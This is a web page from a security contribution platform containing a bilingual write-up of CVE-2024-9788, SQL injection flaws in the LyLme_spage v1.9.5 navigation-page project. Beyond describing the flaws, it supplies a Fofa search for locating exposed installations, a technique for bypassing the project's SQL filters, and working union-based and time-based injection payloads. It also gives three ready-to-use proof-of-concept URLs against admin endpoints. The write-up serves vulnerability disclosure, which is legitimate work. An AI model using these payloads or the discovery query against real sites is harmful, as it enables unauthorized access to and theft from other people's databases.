
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="一个团队使用的贡献平台">
  <meta name="keywords" content="安全,团队,贡献">
  <meta name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>【原创】（CVE-2024-9788）LyLme_spage v1.9.5 SQL注入漏洞 | 安全团队贡献平台</title>

  <link rel="icon" type="image/ico" href="/static/img/main.ico">

  <!-- Set render engine for 360 browser -->
  <meta name="renderer" content="webkit">

  <!-- No Baidu Siteapp-->
  <meta http-equiv="Cache-Control" content="no-siteapp"/>

  <!-- Add to homescreen for Chrome on Android -->
  <meta name="mobile-web-app-capable" content="yes">

  <!-- Add to homescreen for Safari on iOS -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="安全团队贡献平台"/>

  <!-- SEO: If your mobile URL is different from the desktop URL, add a canonical link to the desktop page https://developers.google.com/webmasters/smartphone-sites/feature-phones -->
  <!--
  <link rel="canonical" href="http://www.example.com/">
  -->
  <link rel="stylesheet" href="/static/normalize.css/normalize.min.css">
  <link rel="stylesheet" href="/static/amazeui-2.7.2/dist/css/amazeui.min.css">
  <link rel="stylesheet" href="/static/css/archive.css">
  
  
<link rel="stylesheet" href="/static/css/code.css">

</head>
<body>
<header class="am-topbar am-g am-g-collapse">
<div class="am-container" style="padding-left: 0">
  <div class="am-u-sm-centered">
  <h1 class="am-topbar-brand">
    <a href="#">安全团队贡献平台</a>
  </h1>

  <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only" data-am-collapse="{target: '#doc-topbar-collapse'}">
      <span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span>
  </button>

  <div class="am-collapse am-topbar-collapse" id="doc-topbar-collapse">
    <ul class="am-nav am-nav-pills am-topbar-nav">
      <li ><a href="/">首页</a></li>
      <!--<li ><a href="/list/">所有信息</a></li>-->
	  <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          所有信息 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
            <li ><a href="/list/all/">所有情报</a></li>
			<li ><a href="/list/recommend/">推荐专区</a></li>
			<li ><a href="/list/wiki/">综合情报</a></li>
			<li ><a href="/list/userpost/">用户提交</a></li>
			<li ><a href="/list/school/">高校情报</a></li>
        </ul>
      </li>
      <li ><a href="/user/">排行榜</a></li>
      <li ><a href="/gift/">礼品中心</a></li>
	  <li ><a href="/search/">搜索</a></li>
      <li ><a href="/announcements/">公告</a></li>
	  <li ><a href="/ip/">IPwhois<sup>新功能</sup></a></li>
	  <li ><a href="/wooyun/" target="_blank">WooYun drops<sup>新功能</sup></a></li>
      <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          更多 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/edudata" target="_blank">edudata平台</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3629/" target="_blank">零组知识库-006应急响应目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3631/" target="_blank">零组知识库-007内网渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3632/" target="_blank">零组知识库-009安全技术目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3633/" target="_blank">零组知识库-010域渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3634/" target="_blank">零组知识库-011运维与二进制安全目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/xss" target="_blank">XSS平台</a></li>
            
          
            
                <li><a href="http://data.shikangsi.com/" target="_blank">edusrc数据分析</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/links/" target="_blank">友情链接</a></li>
            
          
            
          
            
          
            
                <li><a href="https://wiki.shikangsi.com/zone/" target="_blank">wiki社区</a></li>
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
        </ul>
      </li>
    </ul>
	
        
    <div class="am-topbar-right">
      <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/add/">提交贡献</a>
    </div>
	
	<div class="am-topbar-right">
        <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/login/">登录</a>
    </div>
	<div class="am-topbar-right">
        <a class="am-btn am-btn-secondary am-topbar-btn am-btn-sm" href="/register/">注册</a>
    </div>
	


  </div>
  </div>
</div>
</header>


<div class="am-container">
<div class="am-g">
  <div class="am-u-sm-centered am-u-sm-11">
      <article class="am-article">
          <div class="am-article-hd">
            <h1 class="am-article-title">【原创】（CVE-2024-9788）LyLme_spage v1.9.5 SQL注入漏洞</h1>
              <hr />
              <button type="button" class="am-btn am-btn-primary btn-copy" data-am-popover="{content: '已复制'}">分享</button>
              <h3>当前为私密分享，无需登录即可查看。</h3>
              <hr />
          </div>

          <table class="am-table am-table-bordered ">
              <tr>
                  <th>时间</th>
                  <th class="am-text-center am-hide-sm-down">作者</th>
				  <th width="8%" class="am-text-center am-hide-sm-down">可见性</th>
                  <th width="8%" class="am-text-center am-hide-sm-down">等级</th>
                  <th class="am-text-center am-hide-sm-down">Rank</th>
              </tr>
              <tr>
              <tr>
                  <td>2024-09-26 12:30:44</td>
                  <td class="am-text-center am-hide-sm-down"><a href="/profile/1280/" class="am-link-muted">Jing</a></td>
				  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-success">公开的</span></td>
                  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-warning">高危</span></td>
                  <td class="am-text-center am-hide-sm-down">3</td>
              </tr>
            </table>

          <div class="am-article-bd">
            <p class="">CVE-2024-9788<br>CVE-2024-9789<br>CVE-2024-9790<br>Created: 10/10/2024 08:47 AM<br>Changes: 10/10/2024 08:47 AM (55)<br>Submitter: Jing@wiki</p>
              <hr>
            <h1>漏洞描述</h1>
<pre class="codehilite"><code> - Summary
</code></pre>

<p>LyLme_spage 是一个开源的导航页项目，旨在为用户提供便捷的网页导航服务。项目地址：<a href="https://github.com/LyLme/lylme_spage" target="_blank">LyLme/lylme_spage: 六零导航页 (github.com)</a></p>
<pre class="codehilite"><code> - LyLme_spage is an open-source navigation page project designed to provide users with convenient web navigation services. Project address: LyLme/lylme_spage: Liuling Navigation Page.
</code></pre>

<p>LyLme_spage v1.9.5 版本中存在 多个SQL 注入漏洞。攻击者可以通过构造特定的 SQL 语句，绕过输入过滤，执行未授权的数据库查询操作。由于 group_concat 函数被过滤，攻击者利用 concat_ws 函数进行数据查询。此外，通过修改 LIMIT 参数，攻击者可以遍历数据库中的表名和数据。攻击者还可以通过 sleep 函数实现延时效果，进一步探测数据库结构。</p>
<pre class="codehilite"><code> - However, version 1.9.5 of the project contains multiple SQL injection vulnerabilities. Attackers can exploit these vulnerabilities by constructing specific SQL statements to bypass input filtering and execute unauthorized database queries. In version 1.9.5 of LyLme_spage, multiple SQL injection vulnerabilities exist. Attackers can construct specific SQL statements to bypass input filtering and perform unauthorized database queries. 
 - Since the group_concat function is filtered, attackers use the concat_ws function for data queries. Additionally, by modifying the LIMIT parameter, attackers can iterate through table names and data in the database. Attackers can also use the sleep function to achieve a delay effect, further probing the database structure.
</code></pre>

<p>SQL 注入点 1 位于 /admin/tag.php，通过修改 id 参数构造注入语句。<br />
SQL 注入点 2 位于 /admin/apply.php，同样通过修改 id 参数构造注入语句。<br />
SQL 注入点 3 位于 /admin/sou.php，通过修改 id 参数构造注入语句。</p>
<pre class="codehilite"><code> - SQL injection point 1 is located at /admin/tag.php, where an injection statement can be constructed by modifying the id parameter.
 - SQL injection point 2 is located at /admin/apply.php, where an injection statement can also be constructed by modifying the id parameter.
 - SQL injection point 3 is located at /admin/sou.php, where an injection statement can be constructed by modifying the id parameter.
</code></pre>

<h1>资产测绘</h1>
<pre class="codehilite"><code> - Fofa query keyword
</code></pre>

<p><code>&quot;LyLme_spage&quot; && icon_hash=&quot;-282504889&quot;</code></p>
<p><img alt="null" src="/media/images/2024/09/26/03aa1e5f-6f11-4a1e-aa4d-2e6e70cd4e32-3Wh3gBjD.png" /></p>
<h1>审计过程</h1>
<pre class="codehilite"><code> - Discovery process
</code></pre>

<p><img alt="null" src="/media/images/2024/09/26/77a59aaf-76ef-499c-abae-d0aa95bff335-qYsR8ntl.png" /></p>
<p>如图，虽然做了许多对于SQL注入的过滤，但是任然可以绕过。</p>
<pre class="codehilite"><code> - As shown in the figure, although many filters for SQL injection have been implemented, they can still be bypassed.
</code></pre>

<p><img alt="null" src="/media/images/2024/09/26/2c58c901-b3be-4f98-bfc3-b5b8bba40a1f-JcG8L8OF.png" /></p>
<p>正常被过滤页面</p>
<pre class="codehilite"><code> - Normally Filtered Page
</code></pre>

<p><img alt="null" src="/media/images/2024/09/26/ba3bf33d-4fcb-4100-a7c5-f95e10238925-xs539lqe.png" /></p>
<p>Payload:</p>
<p><code>-7&#039;+unioN+select%23xxxx%0a1,database(),user(),4,(select%23xxxx%0aCONCAT_WS(&#039;,&#039;,TABLE_NAME)+test+from+information_schema.tables+where+table_schema=&#039;liuzero&#039;+LIMIT+2,1)--+</code></p>
<p>通过替换limit中 2 遍历表名，遍历数据同原理，主要group_concat被过滤，但是concat_ws可绕过select通过%23xxxx%0a绕过</p>
<pre class="codehilite"><code> - By replacing the 2 in LIMIT, table names can be iterated through. The principle for iterating through data is the same. The main point is that group_concat is filtered, but concat_ws can be bypassed. Select can be bypassed through %23xxxx%0a.
</code></pre>

<p><img alt="null" src="/media/images/2024/09/26/a87e6f00-1b7c-4a95-b793-67b4ab740a1f-IehWFN93.png" /></p>
<p>当然也可以达到延时效果</p>
<pre class="codehilite"><code> - Of course, a delay effect can also be achieved.
</code></pre>

<p>Payload：</p>
<p>7&#039;+and+<code>sleep</code>(5)--+</p>
<p><img alt="null" src="/media/images/2024/09/26/aaa66ce5-6c67-4c97-ae6c-9ac88d4c7f29-HaFKCf5q.png" /></p>
<h1>POC</h1>
<h2>SQL注入点1：/admin/tag.php</h2>
<pre class="codehilite"><code> - SQL Injection Point 1 POC
</code></pre>

<p><code>/admin/tag.php?set=edit&id=-7&#039;+unioN+select%23xxxx%0a1,database(),user(),4,(select%23xxxx%0aCONCAT_WS(&#039;,&#039;,TABLE_NAME)+test+from+information_schema.tables+where+table_schema=&#039;liuzero&#039;+LIMIT+2,1)--</code></p>
<p><img alt="null" src="/media/images/2024/09/26/8efd252f-c416-4dd6-90f5-2051a63de620-ePn02NkZ.png" /></p>
<p><img alt="null" src="/media/images/2024/09/26/ef1e894a-e2de-464a-ad6c-3fc8e5698dc6-cnPFzeon.png" /></p>
<h2>SQL注入点2：/admin/apply.php</h2>
<pre class="codehilite"><code> - SQL Injection Point 2 POC
</code></pre>

<p><code>/admin/apply.php?set=edit&id=-1&#039;+unioN+select%23xxxx%0a1,database(),(select%23xxxx%0aCONCAT_WS(&#039;,&#039;,TABLE_NAME)+test+from+information_schema.tables+where+table_schema=&#039;liuzero&#039;+LIMIT+1,1),4,5,6,7,8--+</code></p>
<p><img alt="null" src="/media/images/2024/09/26/380daf63-4d9c-4d4f-b038-821060abb26d-taIp5ULA.png" /></p>
<p><img alt="null" src="/media/images/2024/09/26/1219e434-ab14-4339-9524-0d0afe102b60-7qhuPxm3.png" /></p>
<h2>SQL注入点3 ：/admin/sou.php</h2>
<pre class="codehilite"><code> - SQL Injection Point 3 POC
</code></pre>

<p><code>/admin/sou.php?set=edit&id=-1&#039;+unioN+select%23xxxx%0a1,database(),(select%23xxxx%0aCONCAT_WS(&#039;,&#039;,TABLE_NAME)+test+from+information_schema.tables+where+table_schema=&#039;liuzero&#039;+LIMIT+1,1),4,5,6,7,8,9,10--+</code></p>
<p><img alt="null" src="/media/images/2024/09/26/8b1152b0-b7c3-406e-8a3b-a8eb0426a93e-FFXZCDZZ.png" /></p>
<p><img alt="null" src="/media/images/2024/09/26/2cfc7e58-56f5-4849-8c16-83f79462264d-Ii0NNIBP.png" /></p>
          </div>

          


      </article>

      <hr>
      <section class="am-panel am-panel-default">
          <div class="am-panel-bd am-text-sm">
            审核评价： 没有任何评价...
          </div>
        </section>

  </div>
</div>
</div>
<div class="main-footer" style="margin:5% 0 auto;text-align:center;">
    2014-2022 © 联系邮箱：<a href="mailto:admin@sg95.cn">admin@sg95.cn</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://beian.miit.gov.cn">鄂ICP备15020128号-4</a><br>
</div>


<!--<footer class="footer" id="footer">

</footer>
-->
<script src="/static/jquery-3.3.1/dist/jquery.min.js"></script>
<script src="/static/amazeui-2.7.2/dist/js/amazeui.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.newsTicker.min.js"></script>
<script type="text/javascript" src="/js/"></script>
<script>
    const input = document.getElementById('keyword');

    $(document).on('input keypress', function(event) {
    const value = input.value;
    console.log(value); // 获取并处理输入值
    if(event.keyCode==13){
        event.preventDefault();
        event.stopPropagation();
        var url=window.location.origin+'/search/'+value;
        console.log(url);
        window.location.href=url;
    }
});
$("#searchBtn").click(function(){
var url=window.location.origin+'/search/'+$("#keyword").val();
console.log(url);
window.location.href=url;
});
$("#ipwhois").click(function(){
var url=window.location.origin+'/ip/'+$("#ip").val();
console.log(url);
window.location.href=url;
});
</script>

<script src="/static/js/archive.js"></script>
<script src="/static/clipboardjs-2.0.10/clipboard.min.js"></script>
<script type="text/javascript">
function escape(txt) {
    return txt && txt.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function reply(id, touser) {
    $("#id_parent").val(id);
    touser = escape('回复 “ ' + touser + ' ”');
    touser = $('<div class="am-alert am-text-sm" id="my-alert" data-am-alert><button type="button" class="am-close">&times;</button><p>'+touser+'</p></div>')
    $('#reply-box').html(touser);
    $('#my-alert').on('closed.alert.amui', function() {
      $("#id_parent").val('');
    });
}
//修改超链接地址
$(document).ready(function(){
if($('.am-article-bd').html().indexOf('http:///article')!==-1){
$('a').each(function(){
var url=$(this).attr('href');
var localURL=window.location.origin;
url=url.replace("http://",localURL);
$(this).attr('href',url);
})
}
else{
console.log('该页面无需替换。');
}
});
</script>

</body>
</html>